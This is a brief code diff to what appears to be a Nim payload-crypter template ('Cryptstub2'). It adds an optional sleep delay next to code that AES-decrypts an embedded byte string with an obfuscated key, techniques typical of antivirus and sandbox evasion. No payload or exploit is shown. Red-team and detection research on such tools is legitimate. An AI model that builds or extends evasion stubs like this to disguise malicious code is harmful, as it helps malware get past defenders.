@@ -955,6 +955,10 @@ var dctx: ECB[aes256]
 """
 
 let Cryptstub2 = fmt"""
+
+when defined(sleepinbetween):
+    var sleepbetweentime: int = {sleepinbetween}
+
 var enctext: seq[byte] = toByteSeq(encstring)
 var key: array[aes256.sizeKey, byte]
 var envkey: string = obf("{envkey}")
